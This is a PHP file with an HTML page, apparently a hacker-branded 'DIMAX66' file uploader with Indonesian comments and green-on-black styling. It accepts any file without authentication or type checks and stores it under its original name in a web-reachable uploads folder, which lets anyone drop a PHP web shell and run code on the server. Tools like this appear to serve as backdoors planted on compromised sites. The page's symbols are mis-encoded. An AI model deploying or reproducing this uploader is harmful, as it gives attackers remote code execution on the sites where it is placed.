<?php
// â˜… DIMAX66 SIMPLE UPLOADER â˜…
// Buatan khusus untuk upload file cepat & mudah

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_dir = __DIR__ . '/uploads/'; // Folder tempat menyimpan file
    if (!is_dir($target_dir)) {
        mkdir($target_dir, 0755, true);
    }

    if (isset($_FILES['file'])) {
        $file_name = basename($_FILES['file']['name']);
        $target_file = $target_dir . $file_name;

        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "<div style='color:lime;'>âœ… File berhasil diupload ke: <b>uploads/$file_name</b></div>";
        } else {
            echo "<div style='color:red;'>âŒ Gagal mengupload file.</div>";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>â˜… DIMAX66 UPLOADER â˜…</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .box {
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border: 1px solid #0f0;
            border-radius: 10px;
            text-align: center;
        }
        input[type="file"] {
            border: 1px solid #0f0;
            padding: 5px;
            color: #0f0;
            background: transparent;
        }
        input[type="submit"] {
            margin-top: 10px;
            padding: 6px 15px;
            background: #0f0;
            border: none;
            color: #000;
            cursor: pointer;
            font-weight: bold;
        }
        input[type="submit"]:hover {
            background: #9f9;
        }
    </style>
</head>
<body>
<div class="box">
    <h2>â˜… DIMAX66 FILE UPLOADER â˜…</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file"><br>
        <input type="submit" value="Upload File">
    </form>
</div>
</body>
</html>
